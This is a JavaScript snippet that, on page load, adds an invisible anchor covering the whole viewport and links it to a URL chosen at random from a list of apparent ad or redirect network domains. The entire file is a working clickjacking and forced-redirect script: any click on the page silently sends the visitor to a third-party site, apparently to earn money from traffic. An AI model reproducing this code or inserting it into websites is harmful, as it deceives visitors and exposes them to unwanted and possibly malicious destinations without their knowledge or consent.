function createLink() {
  var urls = [
    // hil: db (ss)
    // "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    "https://tidy-status.com/bS3.VD0oPL3npkvjbEm/VuJfZ/Du0o1ZNJDaMV2jOMTJcy2/LpTsU/0-Mdz/Y/5vNrzRcY",
    // hil: db-"https://www.qrcreate.online",
    "https://tidy-status.com/BskeKo",
    
    // mon: db
    "https://laichegloavy.com/4/7631332",
    // "https://vorsoutseemt.com/4/7436813",
    // "https://eedootefaug.net/4/7420698",
    // "https://futseerdoa.com/4/7237921",
    "https://eeboazurg.net/4/7420696",
    "https://psauwaun.com/4/7614690",
    "https://ptougeegnep.net/4/7237907",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);